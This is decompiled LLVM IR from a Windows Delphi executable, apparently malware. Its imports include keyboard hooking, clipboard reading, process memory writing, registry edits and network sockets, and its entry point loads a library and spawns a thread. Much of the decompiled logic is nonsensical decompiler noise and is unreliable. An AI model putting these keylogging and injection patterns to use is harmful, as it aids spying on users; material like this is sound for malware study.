  store i8 %27, i8* %24, align 1, !insn.addr !2030
  %28 = trunc i32 %arg3 to i16, !insn.addr !2031
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2031
  %30 = load i32, i32* %29, align 4, !insn.addr !2031
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2031
  %31 = add i32 %arg5, 67, !insn.addr !2032
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2032
  %34 = load i32, i32* %33, align 4, !insn.addr !2032
  %35 = load i8, i8* %24, align 1, !insn.addr !2033
  %36 = add i8 %35, %26, !insn.addr !2033
  store i8 %36, i8* %24, align 1, !insn.addr !2033
  %37 = mul i32 %34, 1557718248, !insn.addr !2034
  %38 = add i32 %arg7, 97, !insn.addr !2034
  %39 = add i32 %38, %37, !insn.addr !2034
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2034
  %41 = load i8, i8* %40, align 1, !insn.addr !2034
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2034
  %44 = add i8 %43, %41, !insn.addr !2034
  %45 = icmp eq i8 %44, 0, !insn.addr !2034
  store i8 %44, i8* %40, align 1, !insn.addr !2034
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2035
  br i1 %45, label %dec_label_pc_407a41, label %dec_label_pc_4079cf, !insn.addr !2035

dec_label_pc_4079cf:                              ; preds = %dec_label_pc_4079a0, %dec_label_pc_4079a5
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2036

dec_label_pc_4079d8:                              ; preds = %dec_label_pc_4079a2
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2037
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2037
  store i8 %48, i8* %49, align 1, !insn.addr !2037
  %50 = add i32 %3, 104, !insn.addr !2038
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2038
  %52 = load i8, i8* %51, align 1, !insn.addr !2038
  %53 = udiv i32 %4, 256, !insn.addr !2038
  %54 = trunc i32 %53 to i8, !insn.addr !2038
  %55 = add i8 %52, %54, !insn.addr !2038
  store i8 %55, i8* %51, align 1, !insn.addr !2038
  %56 = trunc i32 %4 to i16, !insn.addr !2039
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2039
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2039
  store i8 %57, i8* %58, align 1, !insn.addr !2039
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2040
  store i8 %59, i8* %58, align 1, !insn.addr !2040
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2041
  store i8 %60, i8* %58, align 1, !insn.addr !2041
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2042
  store i8 %61, i8* %58, align 1, !insn.addr !2042
  %62 = load i8, i8* %51, align 1, !insn.addr !2043
  %63 = trunc i32 %4 to i8, !insn.addr !2043
  %64 = add i8 %62, %63, !insn.addr !2043
  store i8 %64, i8* %51, align 1, !insn.addr !2043
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2044
  store i8 %65, i8* %58, align 1, !insn.addr !2044
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2045
  store i8 %66, i8* %58, align 1, !insn.addr !2045
  %67 = add i32 %2, 1, !insn.addr !2046
  %68 = icmp slt i32 %67, 0, !insn.addr !2046
  br i1 %68, label %dec_label_pc_407a59, label %dec_label_pc_4079f4, !insn.addr !2047

dec_label_pc_4079f4:                              ; preds = %dec_label_pc_4079d8
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2048
  %72 = xor i32 %4, %1, !insn.addr !2049
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2050
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2050
  %76 = load i16, i16* %75, align 2, !insn.addr !2050
  %77 = trunc i32 %72 to i16, !insn.addr !2050
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2050
  %78 = load i8, i8* %73, align 4, !insn.addr !2051
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2051
  %81 = add i8 %78, %80, !insn.addr !2051
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2051
  store i8 %81, i8* %82, align 1, !insn.addr !2051
  %83 = add i32 %71, 82, !insn.addr !2052
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2052
  %85 = load i8, i8* %84, align 1, !insn.addr !2052
  %86 = add i8 %85, %63, !insn.addr !2052
  store i8 %86, i8* %84, align 1, !insn.addr !2052
  %87 = load i32, i32* %eax, align 4, !insn.addr !2053
  %88 = add i32 %87, -1, !insn.addr !2053
  %89 = add i32 %71, 4227341, !insn.addr !2054
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2054
  %91 = load i8, i8* %90, align 1, !insn.addr !2054
  %92 = udiv i32 %88, 256, !insn.addr !2054
  %93 = trunc i32 %92 to i8, !insn.addr !2054
  %94 = add i8 %91, %93, !insn.addr !2054
  store i8 %94, i8* %90, align 1, !insn.addr !2054
  ret i32 %88, !insn.addr !2054

dec_label_pc_407a41:                              ; preds = %dec_label_pc_4079a5
  %95 = add i32 %46, 1, !insn.addr !2055
  store i32 %95, i32* %eax, align 4, !insn.addr !2055
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2056
  %97 = load i8, i8* %96, align 1, !insn.addr !2056
  %98 = udiv i32 %arg3, 256, !insn.addr !2056
  %99 = trunc i32 %98 to i8, !insn.addr !2056
  %100 = add i8 %97, %99, !insn.addr !2056
  store i8 %100, i8* %96, align 1, !insn.addr !2056
  %101 = add i32 %arg3, 89, !insn.addr !2057
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2057
  store i8 -1, i8* %102, align 1, !insn.addr !2057
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2058
  %103 = load i32, i32* %eax, align 4, !insn.addr !2059
  ret i32 %103, !insn.addr !2059

dec_label_pc_407a59:                              ; preds = %dec_label_pc_4079d8
  %104 = load i32, i32* %eax, align 4, !insn.addr !2060
  ret i32 %104, !insn.addr !2060
}

define i32 @function_407a5c() local_unnamed_addr {
dec_label_pc_407a5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2061
  %2 = add i32 %1, -1, !insn.addr !2061
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2061
  ret i32 %0, !insn.addr !2062
}

define i32 @function_407a64() local_unnamed_addr {
dec_label_pc_407a64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2063
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a8f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2064
  ret i32 %0, !insn.addr !2064
}

define i32 @function_407a94() local_unnamed_addr {
dec_label_pc_407a94:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2065
}

define i32 @function_407a96(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a96:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2066
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b80:
  %esp.2.reg2mem = alloca i32, !insn.addr !2067
  %esp.1.reg2mem = alloca i32, !insn.addr !2067
  %esp.0.reg2mem = alloca i32, !insn.addr !2067
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2068
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2069
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2069
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2069
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2070
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2071
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f0 to i8*), i32 0), !insn.addr !2072
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2073
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2073
  store i8 0, i8* %6, align 1, !insn.addr !2073
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2074
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2075
  %9 = call i32 @function_407344(), !insn.addr !2076
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2077
  %11 = call i32 @function_4073bc(), !insn.addr !2078
  %12 = trunc i32 %11 to i8, !insn.addr !2079
  %13 = icmp eq i8 %12, 0, !insn.addr !2079
  br i1 %13, label %dec_label_pc_407c97, label %dec_label_pc_407c1c, !insn.addr !2080

dec_label_pc_407c1c:                              ; preds = %dec_label_pc_407b80
  %14 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2081
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2082
  store i32 -1, i32* %15, align 4, !insn.addr !2082
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2083
  %17 = call i32 @function_407384(), !insn.addr !2084
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2085
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2086
  %20 = call i32 @function_4036c8(), !insn.addr !2087
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2088
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2089
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2090
  %24 = call i32 @function_4036c8(), !insn.addr !2091
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2092
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2092
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2092
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2093
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2093
  store i32 %28, i32* @global_var_408118, align 4, !insn.addr !2094
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2095
  br label %dec_label_pc_407cc4, !insn.addr !2095

dec_label_pc_407c97:                              ; preds = %dec_label_pc_407b80
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2071
  %30 = call i32 @function_406350(), !insn.addr !2096
  %31 = call i32 @function_4073bc(), !insn.addr !2097
  %32 = trunc i32 %31 to i8, !insn.addr !2098
  %33 = icmp eq i8 %32, 0, !insn.addr !2098
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2099
  br i1 %33, label %dec_label_pc_407e06, label %dec_label_pc_407cb9, !insn.addr !2099

dec_label_pc_407cb9:                              ; preds = %dec_label_pc_407c97
  %34 = load i32, i32* @global_var_408138, align 4, !insn.addr !2100
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2101
  store i32 -1, i32* %35, align 4, !insn.addr !2101
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2101
  br label %dec_label_pc_407cc4, !insn.addr !2101

dec_label_pc_407cc4:                              ; preds = %dec_label_pc_407cb9, %dec_label_pc_407c1c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2102
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2102
  store i32 260, i32* %37, align 4, !insn.addr !2102
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2103
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2103
  store i32 ptrtoint (i8** @global_var_4096f0 to i32), i32* %39, align 4, !insn.addr !2103
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2104
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2104
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2105
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2105
  store i32 %41, i32* %43, align 4, !insn.addr !2105
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2106
  %45 = add i32 %44, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2107
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2107
  store i8 0, i8* %46, align 1, !insn.addr !2107
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2108
  %48 = call i32 @function_407384(), !insn.addr !2109
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2110
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2111
  %51 = load i32, i32* @global_var_408138, align 4, !insn.addr !2112
  %52 = icmp eq i32 %51, 0, !insn.addr !2112
  br i1 %52, label %dec_label_pc_407d5d, label %dec_label_pc_407d2a, !insn.addr !2113

dec_label_pc_407d2a:                              ; preds = %dec_label_pc_407cc4
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2114
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2114
  store i32 ptrtoint ([16 x i8]* @global_var_407e88 to i32), i32* %54, align 4, !insn.addr !2114
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2115
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2115
  store i32 ptrtoint ([8 x i8]* @global_var_407e98 to i32), i32* %56, align 4, !insn.addr !2115
  %57 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2116
  %58 = icmp eq i32* %57, null, !insn.addr !2117
  %59 = icmp eq i1 %58, false, !insn.addr !2118
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !2118
  br i1 %59, label %dec_label_pc_407e06, label %dec_label_pc_407d41, !insn.addr !2118

dec_label_pc_407d41:                              ; preds = %dec_label_pc_407d2a
  %60 = add i32 %esp.0.reload, -24, !insn.addr !2119
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2119
  store i32 ptrtoint (i32* @global_var_409808 to i32), i32* %61, align 4, !insn.addr !2119
  %62 = add i32 %esp.0.reload, -28, !insn.addr !2120
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2120
  store i32 0, i32* %63, align 4, !insn.addr !2120
  %64 = add i32 %esp.0.reload, -32, !insn.addr !2121
  %65 = inttoptr i32 %64 to i32*, !insn.addr !2121
  store i32 66, i32* %65, align 4, !insn.addr !2121
  %66 = add i32 %esp.0.reload, -36, !insn.addr !2122
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2122
  store i32 4221388, i32* %67, align 4, !insn.addr !2122
  %68 = add i32 %esp.0.reload, -40, !insn.addr !2123
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2123
  store i32 0, i32* %69, align 4, !insn.addr !2123
  %70 = add i32 %esp.0.reload, -44, !insn.addr !2124
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2124
  store i32 0, i32* %71, align 4, !insn.addr !2124
  %72 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2125
  store i32 %70, i32* %esp.2.reg2mem, !insn.addr !2126
  br label %dec_label_pc_407e06, !insn.addr !2126

dec_label_pc_407d5d:                              ; preds = %dec_label_pc_407cc4
  %73 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2127
  %74 = icmp eq i32 %73, 0, !insn.addr !2127
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !2128
  br i1 %74, label %dec_label_pc_407e06, label %dec_label_pc_407d6b, !insn.addr !2128

dec_label_pc_407d6b:                              ; preds = %dec_label_pc_407d5d
  %75 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2129
  %76 = icmp eq i8 %75, 0, !insn.addr !2129
  br i1 %76, label %dec_label_pc_407d7a, label %dec_label_pc_407d75, !insn.addr !2130

dec_label_pc_407d75:                              ; preds = %dec_label_pc_407d6b
  %77 = call i32 @function_406be4(), !insn.addr !2131
  br label %dec_label_pc_407d7a, !insn.addr !2131

dec_label_pc_407d7a:                              ; preds = %dec_label_pc_407d75, %dec_label_pc_407d6b
  %78 = load i32, i32* @global_var_408148, align 4, !insn.addr !2132
  %79 = icmp slt i32 %78, 1, !insn.addr !2133
  br i1 %79, label %dec_label_pc_407db7, label %dec_label_pc_407d84, !insn.addr !2133

dec_label_pc_407d84:                              ; preds = %dec_label_pc_407d7a
  %80 = call i32 @function_404f98(), !insn.addr !2134
  %81 = call i32 @"@LStrCmp"(), !insn.addr !2135
  %82 = load i32, i32* @global_var_408154, align 4, !insn.addr !2136
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2137
  store i32 -1, i32* %83, align 4, !insn.addr !2137
  %84 = load i32, i32* @global_var_408154, align 4, !insn.addr !2138
  %85 = icmp eq i32 %84, 0, !insn.addr !2138
  br i1 %85, label %dec_label_pc_407db7, label %dec_label_pc_407db2, !insn.addr !2139

dec_label_pc_407db2:                              ; preds = %dec_label_pc_407d84
  %86 = call i32 @function_40626c(), !insn.addr !2140
  br label %dec_label_pc_407db7, !insn.addr !2140

dec_label_pc_407db7:                              ; preds = %dec_label_pc_407db2, %dec_label_pc_407d84, %dec_label_pc_407d7a
  %87 = add i32 %esp.0.reload, -16, !insn.addr !2141
  %88 = inttoptr i32 %87 to i32*, !insn.addr !2141
  store i32 3, i32* %88, align 4, !insn.addr !2141
  %89 = add i32 %esp.0.reload, -20, !insn.addr !2142
  %90 = inttoptr i32 %89 to i32*, !insn.addr !2142
  store i32 16065, i32* %90, align 4, !insn.addr !2142
  %91 = load i32, i32* @global_var_408118, align 4, !insn.addr !2143
  %92 = add i32 %esp.0.reload, -24, !insn.addr !2144
  %93 = inttoptr i32 %92 to i32*, !insn.addr !2144
  store i32 %91, i32* %93, align 4, !insn.addr !2144
  %94 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2145
  %95 = icmp eq i32* %94, null, !insn.addr !2146
  %96 = icmp eq i1 %95, false, !insn.addr !2147
  store i32 %92, i32* %esp.1.reg2mem, !insn.addr !2147
  br i1 %96, label %dec_label_pc_407df7, label %dec_label_pc_407dcd, !insn.addr !2147

dec_label_pc_407dcd:                              ; preds = %dec_label_pc_407db7
  %97 = add i32 %esp.0.reload, -28, !insn.addr !2148
  %98 = inttoptr i32 %97 to i32*, !insn.addr !2148
  store i32 14, i32* %98, align 4, !insn.addr !2148
  %99 = add i32 %esp.0.reload, -32, !insn.addr !2149
  %100 = inttoptr i32 %99 to i32*, !insn.addr !2149
  store i32 16065, i32* %100, align 4, !insn.addr !2149
  %101 = load i32, i32* @global_var_408118, align 4, !insn.addr !2150
  %102 = add i32 %esp.0.reload, -36, !insn.addr !2151
  %103 = inttoptr i32 %102 to i32*, !insn.addr !2151
  store i32 %101, i32* %103, align 4, !insn.addr !2151
  %104 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2152
  %105 = icmp eq i32* %104, null, !insn.addr !2153
  %106 = icmp eq i1 %105, false, !insn.addr !2154
  store i32 %102, i32* %esp.1.reg2mem, !insn.addr !2154
  br i1 %106, label %dec_label_pc_407df7, label %dec_label_pc_407de3, !insn.addr !2154

dec_label_pc_407de3:                              ; preds = %dec_label_pc_407dcd
  %107 = add i32 %esp.0.reload, -40, !insn.addr !2155
  %108 = inttoptr i32 %107 to i32*, !insn.addr !2155
  store i32 16065, i32* %108, align 4, !insn.addr !2155
  %109 = load i32, i32* @global_var_408118, align 4, !insn.addr !2156
  %110 = add i32 %esp.0.reload, -44, !insn.addr !2157
  %111 = inttoptr i32 %110 to i32*, !insn.addr !2157
  store i32 %109, i32* %111, align 4, !insn.addr !2157
  %112 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2158
  %113 = icmp eq i32* %112, null, !insn.addr !2159
  store i32 %110, i32* %esp.1.reg2mem, !insn.addr !2160
  store i32 %110, i32* %esp.2.reg2mem, !insn.addr !2160
  br i1 %113, label %dec_label_pc_407e06, label %dec_label_pc_407df7, !insn.addr !2160

dec_label_pc_407df7:                              ; preds = %dec_label_pc_407de3, %dec_label_pc_407dcd, %dec_label_pc_407db7
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %114 = call i32 @function_407930(), !insn.addr !2161
  store i32 4225636, i32* @global_var_409654, align 4, !insn.addr !2162
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2162
  br label %dec_label_pc_407e06, !insn.addr !2162

dec_label_pc_407e06:                              ; preds = %dec_label_pc_407df7, %dec_label_pc_407de3, %dec_label_pc_407d5d, %dec_label_pc_407d41, %dec_label_pc_407d2a, %dec_label_pc_407c97
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %115 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2163
  %116 = load i32, i32* %115, align 4, !insn.addr !2163
  call void @__writefsdword(i32 0, i32 %116), !insn.addr !2164
  %117 = add i32 %esp.2.reload, 8, !insn.addr !2165
  %118 = inttoptr i32 %117 to i32*, !insn.addr !2165
  store i32 4226600, i32* %118, align 4, !insn.addr !2165
  %119 = call i32 @"@LStrArrayClr"(), !insn.addr !2166
  ret i32 %119, !insn.addr !2167
}

define i32 @function_407e21() local_unnamed_addr {
dec_label_pc_407e21:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2168
  ret i32 %0, !insn.addr !2168
}

define i32 @function_407e26() local_unnamed_addr {
dec_label_pc_407e26:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2169
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

